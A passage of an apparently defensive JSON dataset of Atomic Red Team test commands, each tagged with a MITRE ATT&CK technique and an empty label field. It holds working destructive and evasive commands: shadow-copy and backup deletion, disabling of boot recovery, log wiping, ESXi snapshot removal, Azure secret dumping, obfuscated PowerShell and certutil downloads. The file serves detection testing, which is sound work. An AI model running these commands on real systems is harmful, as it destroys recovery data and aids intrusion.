        "Description": "Removes a Network Share utilizing PowerShell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.005",
        "Shell": "powershell"
    },
    {
        "ID": 615,
        "Command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f\n",
        "Description": "Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 616,
        "Command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete",
        "Description": "Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, “Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.005",
        "Shell": "command_prompt"
    },
    {
        "ID": 617,
        "Command": "if (-not (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt\")) { New-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt\" -Force }\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe\" -accepteula \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt\"\n",
        "Description": "Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1485",
        "Shell": "powershell"
    },
    {
        "ID": 618,
        "Command": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes\n",
        "Description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1485",
        "Shell": "sh"
    },
    {
        "ID": 619,
        "Command": "cipher.exe /w:C:\n",
        "Description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1485",
        "Shell": "command_prompt"
    },
    {
        "ID": 620,
        "Command": "gcloud config set project atomic-test-1\ngcloud storage buckets delete gs://atomic-red-team-bucket\n",
        "Description": "This Atomic will create a Google Storage Bucket then delete it. The idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies when a Google Cloud Platform (GCP) storage bucket is deleted. An adversary may delete a storage bucket in order to disrupt their target's business operations.\nThis atomic will create a bucket then delete the bucket.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1485",
        "Shell": "sh"
    },
    {
        "ID": 621,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" -batch \"atomic.local\" -ssh -l root -pw \"password\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done\"\n",
        "Description": "Deletes all snapshots for all Virtual Machines on an ESXi Host\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#inhibit%20recovery)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1485",
        "Shell": "command_prompt"
    },
    {
        "ID": 622,
        "Command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzurePasswords.ps1\"\n$Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\", $Password\nConnect-AzureRmAccount -Credential $Credential\nGet-AzurePasswords -subscription '' > $env:temp\\T1528Test1.txt\ncat $env:temp\\T1528Test1.txt\n",
        "Description": "Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.\nSee - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1528",
        "Shell": "powershell"
    },
    {
        "ID": 623,
        "Command": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"\n\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n",
        "Description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1133",
        "Shell": "powershell"
    },
    {
        "ID": 624,
        "Command": "vssadmin.exe delete shadows /all /quiet\n",
        "Description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 625,
        "Command": "wmic.exe shadowcopy delete\n",
        "Description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 626,
        "Command": "wbadmin delete catalog -quiet\n",
        "Description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 627,
        "Command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n",
        "Description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 628,
        "Command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n",
        "Description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "powershell"
    },
    {
        "ID": 629,
        "Command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n",
        "Description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 630,
        "Command": "wbadmin delete systemstatebackup -keepVersions:0\n",
        "Description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 631,
        "Command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable\n",
        "Description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 632,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 633,
        "Command": "vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%",
        "Description": "Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "powershell"
    },
    {
        "ID": 634,
        "Command": "sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\n",
        "Description": "This atomic test alters the security settings of the Volume Shadow Copy Service (VSS) by modifying its permissions, potentially impacting system recovery operations. The specific permissions set by the command are as follows:\n- Deny Generic All (GA) permissions to Network Users (NU)\n- Deny GA permissions to Everyone (WD)\n- Deny GA permissions to Anonymous (AN)\n- Allow Full Access (FA) and Generic All (GA) permissions to Everyone (WD) in System ACL (SACL)\n- Allow Object Inherit and Inherit Only (OIIO) Full Access (FA) and GA permissions to Everyone (WD) in SACL\nThese permissions can significantly restrict VSS functionalities, including backup and restore operations. As such, it is essential to run this test only in a controlled environment with administrative privileges.\nA cleanup command is provided to reset VSS permissions to a common default configuration, which should be verified against your specific system's configuration. It's crucial to use this cleanup command after testing to ensure the system's backup and recovery capabilities remain functional. Running this test on a production system or critical environment is not recommended without proper precautions and a robust recovery plan.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "command_prompt"
    },
    {
        "ID": 635,
        "Command": "sudo tmutil disable",
        "Description": "Disables Time Machine which is Apple's automated backup utility software. Attackers can use this to prevent backups from occurring and hinder the victim's ability to recover from any damage.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1490",
        "Shell": "sh"
    },
    {
        "ID": 636,
        "Command": "Mount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\T1553.005.iso\"\n",
        "Description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.005",
        "Shell": "powershell"
    },
    {
        "ID": 637,
        "Command": "Mount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\FeelTheBurn.iso\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"TestIso\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\ninvoke-item \"$($driveLetter):\\hello.exe\"\n",
        "Description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.005",
        "Shell": "powershell"
    },
    {
        "ID": 638,
        "Command": "Unblock-File -Path $env:tmp\\ReadMe.md\n",
        "Description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.005",
        "Shell": "powershell"
    },
    {
        "ID": 639,
        "Command": "Mount-DiskImage -ImagePath \"PathToAtomicsFolder\\T1553.005\\bin\\AllTheThings.iso\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n",
        "Description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1553.005",
        "Shell": "powershell"
    },
    {
        "ID": 640,
        "Command": "Import-Module ExchangeOnlineManagement\n$password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"john@contoso.com\", $password\nConnect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue\nNew-InboxRule -Mailbox jane@contoso.com -Name default -SubjectOrBodyContainsWords (\"phish\",\"malware\",\"hacked\") -Confirm:$false -DeleteMessage:$true\n",
        "Description": "This test simulates a user adding an inbox rule in M365 to delete emails with specific keywords in email subject or body.\n Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.008",
        "Shell": "powershell"
    },
    {
        "ID": 641,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f\n",
        "Description": "An adversary can modify the group policy settings.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1484.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 642,
        "Command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force\n",
        "Description": "An adversary modifies group policy settings\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1484.001",
        "Shell": "powershell"
    },
    {
        "ID": 643,
        "Command": "aws iam create-user --user-name atomicredteam\n",
        "Description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.003",
        "Shell": "sh"
    },
    {
        "ID": 644,
        "Command": "Connect-AzureAD\n$userprincipalname = \"atomicredteam@yourdomain.com\"\n$username = \"atomicredteam\"\\t  \n$password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"\n$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile\n$PasswordProfile.Password = $password\nNew-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username\\t  ",
        "Description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.003",
        "Shell": "powershell"
    },
    {
        "ID": 645,
        "Command": "az login\n$userprincipalname = \"atomicredteam@yourdomain.com\"\n$username = \"atomicredteam\"\\t  \n$password = \"reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg\"\naz ad user create --display-name $username --password $password --user-principal-name $userprincipalname\naz ad user list --filter \"displayname eq 'atomicredteam'\"\\t ",
        "Description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.003",
        "Shell": "powershell"
    },
    {
        "ID": 646,
        "Command": "screencapture /tmp/T1113_desktop.png\n",
        "Description": "Use screencapture command to collect a full desktop screenshot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "bash"
    },
    {
        "ID": 647,
        "Command": "screencapture -x /tmp/T1113_desktop.png\n",
        "Description": "Use screencapture command to collect a full desktop screenshot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "bash"
    },
    {
        "ID": 648,
        "Command": "xwd -root -out /tmp/T1113_desktop.xwd\nxwud -in /tmp/T1113_desktop.xwd\n",
        "Description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "bash"
    },
    {
        "ID": 649,
        "Command": "xwd -root -out /tmp/T1113_desktop.xwd\nxwud -in /tmp/T1113_desktop.xwd\n",
        "Description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "sh"
    },
    {
        "ID": 650,
        "Command": "import -window root /tmp/T1113_desktop.png\n",
        "Description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "bash"
    },
    {
        "ID": 651,
        "Command": "import -window root /tmp/T1113_desktop.png\n",
        "Description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "sh"
    },
    {
        "ID": 652,
        "Command": "cmd /c start /b psr.exe /start /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;\n[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c \"timeout 5 > NULL && psr.exe /stop\"\n",
        "Description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "powershell"
    },
    {
        "ID": 653,
        "Command": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"$env:TEMP\\T1113.png\")\n",
        "Description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "powershell"
    },
    {
        "ID": 654,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f\n",
        "Description": "Detects the enabling of the Windows Recall feature via registry manipulation. Windows Recall can be enabled by deleting the existing \"DisableAIDataAnalysis\" registry value. Adversaries may enable Windows Recall as part of post-exploitation discovery and collection activities. This rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary. \n- https://learn.microsoft.com/en-us/windows/client-management/manage-recall\n- https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowsai#disableaidataanalysis",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1113",
        "Shell": "powershell"
    },
    {
        "ID": 655,
        "Command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64decode -r\"; else cmd=\"base64 -d\"; fi;\ncat /tmp/encoded.dat | $cmd > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n",
        "Description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "sh"
    },
    {
        "ID": 656,
        "Command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n",
        "Description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "powershell"
    },
    {
        "ID": 657,
        "Command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"\n",
        "Description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "powershell"
    },
    {
        "ID": 658,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\"\n",
        "Description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "command_prompt"
    },
    {
        "ID": 659,
        "Command": "Send-MailMessage -From test@corp.com -To test@corp.com -Subject 'T1027_Atomic_Test' -Attachments \"PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm\" -SmtpServer 127.0.0.1\n",
        "Description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "powershell"
    },
    {
        "ID": 660,
        "Command": "Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \"PathToAtomicsFolder\\T1027\\src\\T1027-cc-macro.xlsm\"\n",
        "Description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "powershell"
    },
    {
        "ID": 661,
        "Command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )\n",
        "Description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "powershell"
    },
    {
        "ID": 662,
        "Command": "1. Copy the following command into the command prompt after replacing https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt and Atomic-license.txt with your desired URL and filename.\n\n\n  certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −\"൏ᶠ൸\" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt\n\n\n2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.\n",
        "Description": "This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. ᶠ) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).\nReference:\nhttps://wietze.github.io/blog/windows-command-line-obfuscation\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "manual"
    },
    {
        "ID": 663,
        "Command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\"\n",
        "Description": "The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "powershell"
    },
    {
        "ID": 664,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\"\n",
